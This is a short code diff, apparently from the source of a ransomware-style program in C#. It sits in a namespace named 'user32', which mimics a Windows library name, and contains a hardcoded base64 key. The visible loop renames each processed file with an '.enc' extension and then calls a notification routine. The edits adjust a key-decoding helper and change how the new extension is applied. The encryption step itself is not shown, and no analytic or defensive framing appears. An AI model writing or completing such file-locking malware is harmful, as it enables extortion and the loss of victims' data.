@@ -13,7 +13,7 @@ namespace user32
     {
         private static byte[] GetKey() {
             string k = "dGgxNV9Jc183aDNfa0V5X2xtNDBfWERfOTlfMTMzNyE=";
-            return RevertStr(k);
+            return InvertStr(k);
         }
         public static void Execute()
         {
@@ -37,7 +37,7 @@ namespace user32
                     }
                     FileInfo fext = new FileInfo(p);
                     string extn = fext.Extension;
-                    File.Move(p, Path.ChangeExtension(p, extn+".enc"));
+                    File.Move(p, Path.ChangeExtension(p, ".enc"));
                 }
             }
             Noti();
